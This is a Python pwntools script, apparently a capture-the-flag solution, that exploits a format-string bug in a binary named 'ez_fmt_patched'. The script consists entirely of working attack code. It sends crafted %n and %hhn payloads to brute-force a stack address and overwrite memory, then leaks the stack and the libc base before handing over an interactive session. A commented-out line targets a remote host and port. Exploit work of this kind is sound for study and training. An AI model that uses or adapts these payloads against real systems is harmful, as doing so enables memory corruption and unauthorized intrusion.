from pwn import *

r = process('./ez_fmt_patched')
# r = remote('192.81.209.60', 2022)
bin = ELF('./ez_fmt_patched')
libc = ELF('./libc.so.6')
context.clear(os='linux', arch='x86_64')#, log_level='debug')

def debug():
    gdb.attach(r, '''b*main+112''')

r.sendlineafter(b'Service :##\n', b'%21$cmmm')
last_byte = (r.recvline()[0] - 0x158) & 0xff
guess_two_byte = 0

for i in range(0, 0x100, 3):
    log.info('Count: %#x' % i)
    guess_two_byte = last_byte + 0x300 * i
    payload = f'%{guess_two_byte+0x20}c%21$hnmmm'.encode()
    r.sendline(payload)

    payload = '%49c%49$hhnmmm'.encode()
    r.sendlineafter(b'mmm\n', payload)

    r.sendlineafter(b'mmm\n', b'%10$c%42$c%74$cmmm')
    recv = r.recvuntil(b'mmm\n')
    if recv[0] == 49:
        break

    if  recv[1] == 49:
        guess_two_byte -= 0x100
        break

    if  recv[2] == 49:
        guess_two_byte -= 0x200
        break

log.info('Guess: %#x' % guess_two_byte)
payload = f'%{guess_two_byte-8}c%21$hnmmm'.encode()
r.sendline(payload)
payload = f'%{guess_two_byte+8}c%37$hnmmm'.encode()
r.sendlineafter(b'mmm\n', payload)
val = int.from_bytes(b'p', 'little') - 0x45
payload = f'%{0x45}c%49$hhn%{val}c%51$hhnmmm'.encode()
r.sendlineafter(b'mmm\n', payload)
r.recvuntil(b'mmm\n')
r.recv(0x45)

stack = int(r.recv(14), 16) + 8
log.success('Stack: %#x' % stack)
payload = f'%{guess_two_byte+6}c%37$hnmmm'.encode()
r.sendlineafter(b'mmm\n', payload)

val = int.from_bytes(b'9$p', 'little') - 0x45
payload = f'%{0x45}c%10$hhn%{val}c%51$nmmm'.encode().ljust(0x20, b'\0') + p64(stack-8)
r.sendlineafter(b'mmm\n', payload)
r.recvuntil(b'0x')

libc.address = int(r.recv(12), 16) - 0x240b3
log.success('Libc base: %#x' % libc.address)
r.interactive()